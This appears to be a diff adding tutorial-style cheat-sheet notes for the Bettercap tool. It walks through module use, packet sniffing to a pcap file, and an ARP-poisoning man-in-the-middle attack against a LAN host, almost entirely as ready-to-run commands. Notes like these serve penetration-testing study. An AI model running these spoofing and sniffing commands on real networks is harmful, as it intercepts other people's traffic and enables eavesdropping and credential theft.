@@ -1,0 +1,51 @@
+##########################
+## Bettercap
+##########################
+
+# installing bettercap on Kali
+apt update &&  apt install bettercap
+
+# starting bettercap on an interface
+bettercap -iface eth0
+192.168.0.0/24 > 192.168.0.111  »  
+
+# listing all modules
+192.168.0.0/24 > 192.168.0.111  »  help
+
+# displaying the help of a module
+192.168.0.0/24 > 192.168.0.111  » help arp.spoof
+
+# set an option of a module
+# » set option true|false
+# use <tab> to auto-complete an option of module
+192.168.0.0/24 > 192.168.0.111  » set arp.spoof.fullduplex true
+
+# starting or stopping a module
+# module_name on|off
+192.168.0.0/24 > 192.168.0.111  » net.sniff on
+192.168.0.0/24 > 192.168.0.111  » arp.spoof on
+
+# sniffing to a file
+192.168.0.0/24 > 192.168.0.111  » set net.sniff.output /root/dump.pcap
+
+
+## ARP Poisoning using Bettercap
+
+# starting bettercap
+bettercap -iface eth0
+192.168.0.0/24 > 192.168.0.111  » 
+
+# displaying the help
+192.168.0.0/24 > 192.168.0.111  » help arp.spoof
+
+# setting the options
+192.168.0.0/24 > 192.168.0.111  » set arp.spoof.targets 192.168.0.100
+192.168.0.0/24 > 192.168.0.111  » set arp.spoof.fullduplex true
+
+# starting the module and the attack
+192.168.0.0/24 > 192.168.0.111  » arp.spoof on
+
+
+
+
+
